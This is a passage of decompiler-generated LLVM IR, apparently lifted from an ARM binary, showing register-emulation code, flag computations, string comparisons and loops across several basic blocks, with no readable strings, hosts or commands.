  %v3_94c8 = load i32, i32* %v2_94c8, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v2_94cc = sub i32 %v3_94c8, %v0_94c0
  store i32 %v2_94cc, i32* @r4, align 4
  store i32 %v2_94cc, i32* @r2, align 4
  store i32 %v2_94cc, i32* %v2_94c8, align 4
  %v0_94d8 = load i32, i32* @r7, align 4
  %v1_94d8 = load i32, i32* @r5, align 4
  %v2_94d8 = add i32 %v1_94d8, %v0_94d8
  store i32 %v2_94d8, i32* @r1, align 4
  store i32 %v0_94d8, i32* @r0, align 4
  %v3_94e0 = call i32 @function_13cc0(i32 %v0_94d8, i32 %v2_94d8, i32 %v2_94cc)
  store i32 %v3_94e0, i32* %r0.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r8, align 4
  %v1_94e4 = add i32 %v0_94e4, 656
  %v2_94e4 = inttoptr i32 %v1_94e4 to i32*
  %v3_94e4 = load i32, i32* %v2_94e4, align 4
  store i32 %v3_94e4, i32* @r4, align 4
  store i32 0, i32* @lr, align 4
  %v1_94ec = load i32, i32* %sb.global-to-local, align 4
  %v2_94ec = add i32 %v1_94ec, %v3_94e4
  store i32 %v2_94ec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94f0 = icmp slt i32 %v3_94e4, 0
  store i1 %v1_94f0, i1* %cpsr_n.global-to-local, align 1
  %v2_94f0 = icmp eq i32 %v3_94e4, 0
  store i1 %v2_94f0, i1* %cpsr_z.global-to-local, align 1
  %v3_94f4 = add i32 %v2_94ec, 2116
  %v4_94f4 = inttoptr i32 %v3_94f4 to i8*
  store i8 0, i8* %v4_94f4, align 1
  %v0_94f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_94f8, label %dec_label_pc_9510, label %dec_label_pc_94fc

dec_label_pc_94fc:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_9460
  %v0_94fc = load i32, i32* @r8, align 4
  %v1_94fc = add i32 %v0_94fc, 8
  %v2_94fc = inttoptr i32 %v1_94fc to i32*
  %v3_94fc = load i32, i32* %v2_94fc, align 4
  store i32 %v3_94fc, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9500 = icmp slt i32 %v3_94fc, 0
  store i1 %v1_9500, i1* %cpsr_n.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v3_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  %v5_9504 = icmp sgt i32 %v3_94fc, 0
  br i1 %v5_9504, label %dec_label_pc_9478, label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94fc
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9498

dec_label_pc_9510:                                ; preds = %dec_label_pc_94c8, %dec_label_pc_94c0
  %v0_9510 = load i32, i32* @r8, align 4
  %v1_9510 = add i32 %v0_9510, -1452
  %v2_9510 = inttoptr i32 %v1_9510 to i8*
  %v3_9510 = load i8, i8* %v2_9510, align 1
  %v4_9510 = zext i8 %v3_9510 to i32
  store i32 %v4_9510, i32* %r3.global-to-local, align 4
  %v2_9514 = icmp ugt i8 %v3_9510, 6
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9514 = icmp ult i8 %v3_9510, 7
  store i1 %v6_9514, i1* %cpsr_n.global-to-local, align 1
  %v7_9514 = icmp eq i8 %v3_9510, 7
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9514, label %dec_label_pc_951c, label %dec_label_pc_8838

dec_label_pc_951c:                                ; preds = %dec_label_pc_9510
  %v1_951c = add i32 %v0_9510, 656
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  store i32 %v3_951c, i32* %r3.global-to-local, align 4
  %v1_9520 = add i32 %v3_951c, -1024
  %v2_9520 = icmp ugt i32 %v3_951c, 1023
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = sub i32 1023, %v3_951c
  %v4_9520 = and i32 %v3_9520, %v3_951c
  %v5_9520 = icmp slt i32 %v4_9520, 0
  store i1 %v5_9520, i1* %cpsr_v.global-to-local, align 1
  %v6_9520 = icmp slt i32 %v1_9520, 0
  store i1 %v6_9520, i1* %cpsr_n.global-to-local, align 1
  %v7_9520 = icmp eq i32 %v3_951c, 1024
  store i1 %v7_9520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9520, label %dec_label_pc_9528.loopexit, label %dec_label_pc_9430

dec_label_pc_9528.loopexit:                       ; preds = %dec_label_pc_951c
  %v0_9528.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_9528

dec_label_pc_9528:                                ; preds = %dec_label_pc_9528.loopexit, %dec_label_pc_940c
  %v0_9528 = phi i32 [ %v0_9528.pre, %dec_label_pc_9528.loopexit ], [ %v1_9428, %dec_label_pc_940c ]
  store i32 %v0_9528, i32* @r0, align 4
  %v1_952c = add i32 %v0_9528, 64
  store i32 %v1_952c, i32* @r1, align 4
  store i32 960, i32* @r2, align 4
  %v3_9534 = call i32 @function_13cc0(i32 %v0_9528, i32 %v1_952c, i32 960)
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  %v1_9538 = add i32 %v0_9538, 656
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r3.global-to-local, align 4
  %v1_953c = add i32 %v3_9538, -64
  store i32 %v1_953c, i32* @r4, align 4
  store i32 %v1_953c, i32* %v2_9538, align 4
  br label %dec_label_pc_9430

dec_label_pc_9548:                                ; preds = %dec_label_pc_9478
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_9550 = call i32 @function_122cc(i32 36, i32* null)
  %v0_9554 = load i32, i32* @r4, align 4
  store i32 %v0_9554, i32* %r1.global-to-local, align 4
  store i32 %v3_9550, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9560 = load i32, i32* @r7, align 4
  store i32 %v0_9560, i32* %r0.global-to-local, align 4
  %v4_9564 = call i32 @function_12da0(i32 %v0_9560, i32 %v0_9554, i32 %v3_9550, i32 11)
  store i32 %v4_9564, i32* %r0.global-to-local, align 4
  %v2_9568 = add i32 %v4_9564, 1
  %v3_9568 = icmp eq i32 %v4_9564, -1
  store i1 %v3_9568, i1* %cpsr_c.global-to-local, align 1
  %v4_9568 = sub i32 0, %v4_9564
  %v5_9568 = and i32 %v2_9568, %v4_9568
  %v6_9568 = icmp slt i32 %v5_9568, 0
  store i1 %v6_9568, i1* %cpsr_v.global-to-local, align 1
  %v7_9568 = icmp slt i32 %v2_9568, 0
  store i1 %v7_9568, i1* %cpsr_n.global-to-local, align 1
  %v8_9568 = icmp eq i32 %v2_9568, 0
  store i1 %v8_9568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9568, label %dec_label_pc_9570, label %dec_label_pc_9ad4

dec_label_pc_9570:                                ; preds = %dec_label_pc_9548
  %v0_9570 = load i32, i32* @r8, align 4
  %v1_9570 = add i32 %v0_9570, 8
  %v2_9570 = inttoptr i32 %v1_9570 to i32*
  %v3_9570 = load i32, i32* %v2_9570, align 4
  store i32 %v3_9570, i32* @r6, align 4
  br label %dec_label_pc_9498

dec_label_pc_9578:                                ; preds = %dec_label_pc_94a0
  %v0_9578 = load i32, i32* @r7, align 4
  store i32 %v0_9578, i32* %r0.global-to-local, align 4
  %v1_957c = add i32 %v0_94a0, 656
  %v2_957c = inttoptr i32 %v1_957c to i32*
  %v3_957c = load i32, i32* %v2_957c, align 4
  store i32 %v3_957c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9588 = call i32 @function_12da0(i32 %v0_9578, i32 %v3_957c, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_9588, i32* %r0.global-to-local, align 4
  %v1_958c = add i32 %v5_9588, 1
  %v2_958c = icmp eq i32 %v5_9588, -1
  store i1 %v2_958c, i1* %cpsr_c.global-to-local, align 1
  %v3_958c = sub i32 0, %v5_9588
  %v4_958c = and i32 %v1_958c, %v3_958c
  %v5_958c = icmp slt i32 %v4_958c, 0
  store i1 %v5_958c, i1* %cpsr_v.global-to-local, align 1
  %v6_958c = icmp slt i32 %v1_958c, 0
  store i1 %v6_958c, i1* %cpsr_n.global-to-local, align 1
  %v7_958c = icmp eq i32 %v1_958c, 0
  store i1 %v7_958c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_958c, label %dec_label_pc_94c0, label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9578
  %v0_9594 = load i32, i32* @r8, align 4
  %v1_9594 = add i32 %v0_9594, 656
  %v2_9594 = inttoptr i32 %v1_9594 to i32*
  %v3_9594 = load i32, i32* %v2_9594, align 4
  store i32 %v3_9594, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_95a0 = load i32, i32* @r7, align 4
  store i32 %v0_95a0, i32* %r0.global-to-local, align 4
  %v5_95a4 = call i32 @function_12da0(i32 %v0_95a0, i32 %v3_9594, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  %v1_95a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_95a8 = add i32 %v1_95a8, %v5_95a4
  store i32 %v2_95a8, i32* %ip.global-to-local, align 4
  store i32 %v5_95a4, i32* @r5, align 4
  store i32 %v5_95a4, i32* %r1.global-to-local, align 4
  %v0_95b4 = load i32, i32* @r7, align 4
  store i32 %v0_95b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95bc = load i32, i32* @r4, align 4
  store i32 %v0_95bc, i32* %r3.global-to-local, align 4
  %v0_95c0 = load i32, i32* @r6, align 4
  %v1_95c0 = trunc i32 %v0_95c0 to i8
  %v3_95c0 = add i32 %v2_95a8, 2114
  %v4_95c0 = inttoptr i32 %v3_95c0 to i8*
  store i8 %v1_95c0, i8* %v4_95c0, align 1
  %v4_95c4 = call i32 @function_12da0(i32 %v0_95b4, i32 %v5_95a4, i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32 %v0_95bc)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  %v1_95c8 = add i32 %v4_95c4, 1
  %v2_95c8 = icmp eq i32 %v4_95c4, -1
  store i1 %v2_95c8, i1* %cpsr_c.global-to-local, align 1
  %v3_95c8 = sub i32 0, %v4_95c4
  %v4_95c8 = and i32 %v1_95c8, %v3_95c8
  %v5_95c8 = icmp slt i32 %v4_95c8, 0
  store i1 %v5_95c8, i1* %cpsr_v.global-to-local, align 1
  %v6_95c8 = icmp slt i32 %v1_95c8, 0
  store i1 %v6_95c8, i1* %cpsr_n.global-to-local, align 1
  %v7_95c8 = icmp eq i32 %v1_95c8, 0
  store i1 %v7_95c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95c8, label %dec_label_pc_95ec, label %dec_label_pc_95d0

dec_label_pc_95d0:                                ; preds = %dec_label_pc_9594
  %v0_95d0 = load i32, i32* @r7, align 4
  store i32 %v0_95d0, i32* %r0.global-to-local, align 4
  %v0_95d4 = load i32, i32* @r5, align 4
  store i32 %v0_95d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32* %r2.global-to-local, align 4
  %v0_95dc = load i32, i32* @r4, align 4
  store i32 %v0_95dc, i32* %r3.global-to-local, align 4
  %v4_95e0 = call i32 @function_12da0(i32 %v0_95d0, i32 %v0_95d4, i32 ptrtoint (i32* @global_var_15f7c.42 to i32), i32 %v0_95dc)
  %v1_95e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_95e4 = add i32 %v1_95e4, %v4_95e0
  store i32 %v2_95e4, i32* %r0.global-to-local, align 4
  %v0_95e8 = load i32, i32* @r6, align 4
  %v1_95e8 = trunc i32 %v0_95e8 to i8
  %v3_95e8 = add i32 %v2_95e4, 2116
  %v4_95e8 = inttoptr i32 %v3_95e8 to i8*
  store i8 %v1_95e8, i8* %v4_95e8, align 1
  br label %dec_label_pc_95ec

dec_label_pc_95ec:                                ; preds = %dec_label_pc_9594, %dec_label_pc_95d0
  %v0_95ec = load i32, i32* @r7, align 4
  store i32 %v0_95ec, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_95f4 = inttoptr i32 %v0_95ec to i8*
  %v3_95f4 = call i32 @function_12e08(i8* %v2_95f4, i32 16)
  store i32 %v3_95f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_95f8 = icmp slt i32 %v3_95f4, 0
  store i1 %v1_95f8, i1* %cpsr_n.global-to-local, align 1
  %v2_95f8 = icmp eq i32 %v3_95f4, 0
  store i1 %v2_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f8, label %dec_label_pc_9d84, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ec
  %v1_9600 = add i32 %v3_95f4, 2
  store i32 %v1_9600, i32* %r6.global-to-local, align 4
  %v1_9604 = load i32, i32* @r8, align 4
  %v2_9604 = add i32 %v1_9604, 8
  %v3_9604 = inttoptr i32 %v2_9604 to i32*
  store i32 %v1_9600, i32* %v3_9604, align 4
  br label %dec_label_pc_94c0

dec_label_pc_960c:                                ; preds = %dec_label_pc_8cb4
  %v0_960c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_960c, i32* %r1.global-to-local, align 4
  %v0_9610 = load i32, i32* @r6, align 4
  store i32 %v0_9610, i32* @r0, align 4
  %v2_9614 = inttoptr i32 %v0_9610 to i8*
  %v3_9614 = call i32 @function_12d04(i8* %v2_9614, i32 %v0_960c)
  store i32 %v3_9614, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8ccc

dec_label_pc_961c:                                ; preds = %dec_label_pc_8830
  %v0_961c = call i32 @function_13c70()
  store i32 %v0_961c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v0_961c, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_9648.dec_label_pc_9628_crit_edge, %dec_label_pc_961c
  %v1_9628 = phi i32 [ %v1_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ %v0_961c, %dec_label_pc_961c ]
  %v0_9628 = phi i32 [ %v0_9628.pre, %dec_label_pc_9648.dec_label_pc_9628_crit_edge ], [ 0, %dec_label_pc_961c ]
  %v2_9628 = inttoptr i32 %v1_9628 to i32*
  store i32 %v0_9628, i32* %v2_9628, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v0_9630 = load i32, i32* @r8, align 4
  %v1_9630 = add i32 %v0_9630, -1456
  %v2_9630 = inttoptr i32 %v1_9630 to i32*
  %v3_9630 = load i32, i32* %v2_9630, align 4
  store i32 %v3_9630, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_963c = call i32 @function_13ea0(i32 %v3_9630, i32* nonnull %stack_var_-20809, i32 10240, i32 16384)
  store i32 %v5_963c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9640 = icmp slt i32 %v5_963c, 0
  store i1 %v1_9640, i1* %cpsr_n.global-to-local, align 1
  %v2_9640 = icmp eq i32 %v5_963c, 0
  store i1 %v2_9640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9640, label %dec_label_pc_9920, label %dec_label_pc_9648

dec_label_pc_9648:                                ; preds = %dec_label_pc_9628
  %v2_9648 = add i32 %v5_963c, 1
  %v3_9648 = icmp eq i32 %v5_963c, -1
  store i1 %v3_9648, i1* %cpsr_c.global-to-local, align 1
  %v4_9648 = sub i32 0, %v5_963c
  %v5_9648 = and i32 %v2_9648, %v4_9648
  %v6_9648 = icmp slt i32 %v5_9648, 0
  store i1 %v6_9648, i1* %cpsr_v.global-to-local, align 1
  %v7_9648 = icmp slt i32 %v2_9648, 0
  store i1 %v7_9648, i1* %cpsr_n.global-to-local, align 1
  %v8_9648 = icmp eq i32 %v2_9648, 0
  store i1 %v8_9648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9648, label %dec_label_pc_9650, label %dec_label_pc_9648.dec_label_pc_9628_crit_edge

dec_label_pc_9648.dec_label_pc_9628_crit_edge:    ; preds = %dec_label_pc_9648
  %v0_9628.pre = load i32, i32* @r5, align 4
  %v1_9628.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9650:                                ; preds = %dec_label_pc_9648
  %v0_9650 = load i32, i32* @r4, align 4
  %v1_9650 = inttoptr i32 %v0_9650 to i32*
  %v2_9650 = load i32, i32* %v1_9650, align 4
  store i32 %v2_9650, i32* %r3.global-to-local, align 4
  %v1_9654 = add i32 %v2_9650, -11
  %v2_9654 = icmp ugt i32 %v2_9650, 10
  store i1 %v2_9654, i1* %cpsr_c.global-to-local, align 1
  %v3_9654 = sub i32 10, %v2_9650
  %v4_9654 = and i32 %v3_9654, %v2_9650
  %v5_9654 = icmp slt i32 %v4_9654, 0
  store i1 %v5_9654, i1* %cpsr_v.global-to-local, align 1
  %v6_9654 = icmp slt i32 %v1_9654, 0
  store i1 %v6_9654, i1* %cpsr_n.global-to-local, align 1
  %v7_9654 = icmp eq i32 %v2_9650, 11
  store i1 %v7_9654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9654, label %dec_label_pc_9a98, label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_9650, %dec_label_pc_9920
  %v0_965c = load i32, i32* @r8, align 4
  %v1_965c = add i32 %v0_965c, -1456
  %v2_965c = inttoptr i32 %v1_965c to i32*
  %v3_965c = load i32, i32* %v2_965c, align 4
  store i32 %v3_965c, i32* %r0.global-to-local, align 4
  %v1_9660 = call i32 @function_1369c(i32 %v3_965c)
  store i32 %v1_9660, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_966c = load i32, i32* @r8, align 4
  %v2_966c = add i32 %v1_966c, -1456
  %v3_966c = inttoptr i32 %v2_966c to i32*
  store i32 -1, i32* %v3_966c, align 4
  %v0_9670 = load i32, i32* %r1.global-to-local, align 4
  %v1_9670 = trunc i32 %v0_9670 to i8
  %v2_9670 = load i32, i32* @r8, align 4
  %v3_9670 = add i32 %v2_9670, -1452
  %v4_9670 = inttoptr i32 %v3_9670 to i8*
  store i8 %v1_9670, i8* %v4_9670, align 1
  br label %dec_label_pc_8838

dec_label_pc_9678:                                ; preds = %dec_label_pc_934c, %dec_label_pc_9328
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9680 = call i32 @function_122cc(i32 37, i32* null)
  %v0_9684 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9684, i32* @r1, align 4
  store i32 %v3_9680, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9690 = call i32 @function_13030(i8* %tmp199, i32 %v0_9684, i32 %v3_9680)
  store i32 %v4_9690, i32* %r0.global-to-local, align 4
  %v1_9698 = add i32 %v4_9690, 1
  %v2_9698 = icmp eq i32 %v4_9690, -1
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v3_9698 = sub i32 0, %v4_9690
  %v4_9698 = and i32 %v1_9698, %v3_9698
  %v5_9698 = icmp slt i32 %v4_9698, 0
  store i1 %v5_9698, i1* %cpsr_v.global-to-local, align 1
  %v6_9698 = icmp slt i32 %v1_9698, 0
  store i1 %v6_9698, i1* %cpsr_n.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v1_9698, 0
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_9698, label %dec_label_pc_98c0, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9678
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_96ac = call i32 @function_122cc(i32 37, i32* null)
  %v0_96b0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96b0, i32* @r1, align 4
  store i32 %v3_96ac, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_96bc = call i32 @function_13030(i8* %tmp199, i32 %v0_96b0, i32 %v3_96ac)
  store i32 %v4_96bc, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v2_96c8 = add i32 %v4_96bc, %v2_8748
  store i32 %v2_96c8, i32* %r3.global-to-local, align 4
  %v1_96cc = load i32, i32* @r5, align 4
  %v2_96cc = add i32 %v1_96cc, %v2_96c8
  %v3_96cc = inttoptr i32 %v2_96cc to i8*
  %v4_96cc = load i8, i8* %v3_96cc, align 1
  store i32 %v2_8280, i32* %lr.global-to-local, align 4
  %v2_96d4 = icmp ugt i8 %v4_96cc, 31
  store i1 %v2_96d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_96d4 = icmp ult i8 %v4_96cc, 32
  store i1 %v6_96d4, i1* %cpsr_n.global-to-local, align 1
  %v7_96d4 = icmp eq i8 %v4_96cc, 32
  store i1 %v7_96d4, i1* %cpsr_z.global-to-local, align 1
  %v2_96dc = zext i1 %v7_96d4 to i32
  %v2_96dc.v4_96bc = add i32 %v2_96dc, %v4_96bc
  store i32 %v2_96dc.v4_96bc, i32* @r4, align 4
  %v2_96e0 = add i32 %v2_96dc.v4_96bc, %v2_8280
  store i32 %v2_96e0, i32* @r6, align 4
  store i32 %v2_96e0, i32* %r0.global-to-local, align 4
  %v1_96e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_96e8 = sub i32 %v1_96e8, %v2_96dc.v4_96bc
  store i32 %v2_96e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_96f4 = call i32 @function_12da0(i32 %v2_96e0, i32 %v2_96e8, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32 2)
  store i32 %v5_96f4, i32* %r0.global-to-local, align 4
  %v1_96f8 = add i32 %v5_96f4, 1
  %v2_96f8 = icmp eq i32 %v5_96f4, -1
  store i1 %v2_96f8, i1* %cpsr_c.global-to-local, align 1
  %v3_96f8 = sub i32 0, %v5_96f4
  %v4_96f8 = and i32 %v1_96f8, %v3_96f8
  %v5_96f8 = icmp slt i32 %v4_96f8, 0
  store i1 %v5_96f8, i1* %cpsr_v.global-to-local, align 1
  %v6_96f8 = icmp slt i32 %v1_96f8, 0
  store i1 %v6_96f8, i1* %cpsr_n.global-to-local, align 1
  %v7_96f8 = icmp eq i32 %v1_96f8, 0
  store i1 %v7_96f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_96f4, i32* @r7, align 4
  br i1 %v7_96f8, label %dec_label_pc_98c0, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96a4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v1_970c = load i32, i32* @r4, align 4
  %v2_970c = add i32 %v1_970c, %v2_8748
  %v1_9710 = add i32 %v5_96f4, -1
  %v2_9710 = icmp ne i32 %v5_96f4, 0
  store i1 %v2_9710, i1* %cpsr_c.global-to-local, align 1
  %v3_9710 = sub i32 0, %v5_96f4
  %v4_9710 = and i32 %v5_96f4, %v3_9710
  %v5_9710 = icmp slt i32 %v4_9710, 0
  store i1 %v5_9710, i1* %cpsr_v.global-to-local, align 1
  %v6_9710 = icmp slt i32 %v1_9710, 0
  store i1 %v6_9710, i1* %cpsr_n.global-to-local, align 1
  %v7_9710 = icmp eq i32 %v5_96f4, 1
  store i1 %v7_9710, i1* %cpsr_z.global-to-local, align 1
  %v1_9714 = add i32 %v2_970c, -20736
  store i32 %v1_9714, i32* %r3.global-to-local, align 4
  %v7_9718 = icmp sgt i32 %v5_96f4, 1
  br i1 %v7_9718, label %bb231, label %bb232

bb231:                                            ; preds = %dec_label_pc_9704
  %v9_9718 = add i32 %v5_96f4, -2
  store i32 %v9_9718, i32* @r7, align 4
  br label %bb232

bb232:                                            ; preds = %dec_label_pc_9704, %bb231
  %v3_9724 = phi i32 [ %v5_96f4, %dec_label_pc_9704 ], [ %v9_9718, %bb231 ]
  %v1_971c = add i32 %v2_970c, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_9724 = add i32 %v1_971c, %v3_9724
  %v5_9724 = inttoptr i32 %v4_9724 to i8*
  store i8 0, i8* %v5_9724, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* @lr, align 4
  %v1_9738 = load i32, i32* @r4, align 4
  %v2_9738 = add i32 %v1_9738, %v2_8280
  %v3_9738 = inttoptr i32 %v2_9738 to i8*
  %v4_9738 = load i8, i8* %v3_9738, align 1
  %v6_9738 = zext i8 %v4_9738 to i32
  store i32 %v6_9738, i32* %r0.global-to-local, align 4
  %v1_973c = add nsw i32 %v6_9738, -48
  store i32 %v1_973c, i32* %r3.global-to-local, align 4
  %v2_9740 = icmp ugt i32 %v1_973c, 8
  store i1 %v2_9740, i1* %cpsr_c.global-to-local, align 1
  %v3_9740 = sub nsw i32 56, %v6_9738
  %v4_9740 = and i32 %v3_9740, %v1_973c
  %v5_9740 = icmp slt i32 %v4_9740, 0
  store i1 %v5_9740, i1* %cpsr_v.global-to-local, align 1
  %v6_9740 = icmp ult i8 %v4_9738, 57
  store i1 %v6_9740, i1* %cpsr_n.global-to-local, align 1
  %v7_9740 = icmp eq i32 %v1_973c, 9
  store i1 %v7_9740, i1* %cpsr_z.global-to-local, align 1
  %v2_9744 = xor i1 %v7_9740, true
  %v3_9744 = and i1 %v2_9740, %v2_9744
  br i1 %v3_9744, label %.thread142, label %dec_label_pc_974c

.thread142:                                       ; preds = %bb232
  %v4_9744 = load i32, i32* @r6, align 4
  br label %dec_label_pc_9774

dec_label_pc_974c:                                ; preds = %bb232
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_975c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9750, %dec_label_pc_974c
  %v0_9750 = phi i32 [ %v1_9750, %dec_label_pc_9750 ], [ 0, %dec_label_pc_974c ]
  %v1_9750 = add i32 %v0_9750, 1
  store i32 %v1_9750, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 %v1_9750, i32* %stack_var_-40, align 4
  %v2_975c = add i32 %v1_9750, %v1_975c.pre
  %v3_975c = inttoptr i32 %v2_975c to i8*
  %v4_975c = load i8, i8* %v3_975c, align 1
  %v6_975c = zext i8 %v4_975c to i32
  store i32 %v6_975c, i32* %r0.global-to-local, align 4
  %v1_9760 = add nsw i32 %v6_975c, -48
  %v2_9764 = icmp ugt i32 %v1_9760, 8
  store i1 %v2_9764, i1* %cpsr_c.global-to-local, align 1
  %v3_9764 = sub nsw i32 56, %v6_975c
  %v4_9764 = and i32 %v3_9764, %v1_9760
  %v5_9764 = icmp slt i32 %v4_9764, 0
  store i1 %v5_9764, i1* %cpsr_v.global-to-local, align 1
  %v6_9764 = icmp ult i8 %v4_975c, 57
  store i1 %v6_9764, i1* %cpsr_n.global-to-local, align 1
  %v7_9764 = icmp eq i32 %v1_9760, 9
  store i1 %v7_9764, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9750, i32* %r3.global-to-local, align 4
  %v2_976c = xor i1 %v2_9764, true
  %v3_976c = or i1 %v7_9764, %v2_976c
  br i1 %v3_976c, label %dec_label_pc_9750, label %dec_label_pc_9774

dec_label_pc_9774:                                ; preds = %dec_label_pc_9750, %.thread142
  %v2_9780 = phi i32 [ %v4_9744, %.thread142 ], [ %v2_975c, %dec_label_pc_9750 ]
  %v0_9774 = phi i32 [ %v6_9738, %.thread142 ], [ %v6_975c, %dec_label_pc_9750 ]
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9774 = icmp eq i32 %v0_9774, 0
  store i1 %v2_9774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9774, label %dec_label_pc_98c0, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9774
  store i32 0, i32* @r5, align 4
  %v3_9780 = inttoptr i32 %v2_9780 to i8*
  store i8 0, i8* %v3_9780, align 1
